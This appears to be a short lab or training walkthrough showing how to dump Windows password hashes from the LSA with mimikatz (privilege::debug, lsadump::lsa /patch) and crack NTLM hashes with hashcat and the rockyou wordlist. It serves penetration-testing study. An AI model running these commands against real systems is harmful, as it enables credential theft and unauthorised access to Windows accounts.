# Dumping hashes w/ mimikatz

\


### Dump Hashes w/ mimikatz -

1.) `cd Downloads && mimikatz.exe` this will cd into the directory that mimikatz is kept as well as run the mimikatz binary\


<div align="left">

<figure><img src="../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

</div>

\
2.) `privilege::debug` ensure that the output is "Privilege '20' ok" - This ensures that you're running mimikatz as an administrator; if you don't run mimikatz as an administrator, mimikatz will not run properly\


<div align="left">

<figure><img src="../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

</div>

\
3.) `lsadump::lsa /patch` Dump those hashes!\


<div align="left">

<figure><img src="../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

</div>

### Crack those hashes w/ hashcat

﻿

1.) `hashcat -m 1000 <hash> rockyou.txt`   &#x20;

<figure><img src="../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

\
Mimikatz has many uses along side being a great tool to dump hashes we will cover another one of those ways of using mimikatz in the next task by creating a golden ticket with mimikatz\
